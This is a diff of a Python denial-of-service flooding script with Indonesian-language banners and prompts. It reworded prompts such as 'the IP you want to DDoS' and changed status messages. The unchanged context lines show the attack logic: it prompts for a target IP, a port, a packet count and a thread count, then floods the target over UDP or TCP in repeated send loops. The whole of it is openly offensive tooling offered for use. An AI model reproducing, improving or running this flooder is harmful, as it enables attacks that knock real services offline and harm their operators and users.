@@ -10,8 +10,8 @@ print("~~~ BISMILLAH DOANG!!!!!~~~")
 print("~~~ Script ini dibuat hanya untuk GILBERT. ~~~")
 print("~~~ Gassssss!!!!!!!! ~~~")
 print("~~~ SKUD KITA DDOS . ~~~")
-ip = str(input(" Target Ip:"))
-port = int(input(" Target Port:"))
+ip = str(input(" IP YANG MAU LU DDOS:"))
+port = int(input(" PORTAL NYA:"))
 choice = str(input(" UDP(y/n):"))
 times = int(input(" Paket yang dikirim ke target:"))
 threads = int(input(" Threads yang dikirim:"))
@@ -24,7 +24,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" AYANG PAKET!!!")
+			print(i +" PAKET LAGI OTW!!!")
 		except:
 			print("[!] GAGALTOD!!!")
 
@@ -38,7 +38,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" KIMOCHI KIMOCHI!!!")
+			print(i +" SAMPEEEE!!!")
 		except:
 			s.close()
 			print("[*] Error")
